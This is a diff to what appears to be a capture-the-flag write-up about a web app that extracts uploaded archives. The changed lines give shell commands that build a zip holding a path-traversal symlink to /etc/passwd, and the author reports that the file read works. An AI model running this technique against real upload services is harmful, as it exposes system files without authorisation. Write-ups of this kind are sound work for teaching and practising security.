@@ -17,7 +17,7 @@ So web upload, only accept zip, rar, tar. The uploaded file will be extracted on
 
 I tried to upload a shell, but when open it will download it, only text file are showed. So I tried upload symbolic link to the /etc/passwd file (https://www.cyberciti.biz/faq/creating-soft-link-or-symbolic-link/):
 ```
-ln -s "../../../../../../../../../../home/joyhopkins" link
+ln -s "../../../../../../../../../../etc/passwd" link
 zip -y test2.zip link
 ```
 And it work: (skip those lmao file, i forgot to clear the folder xD )
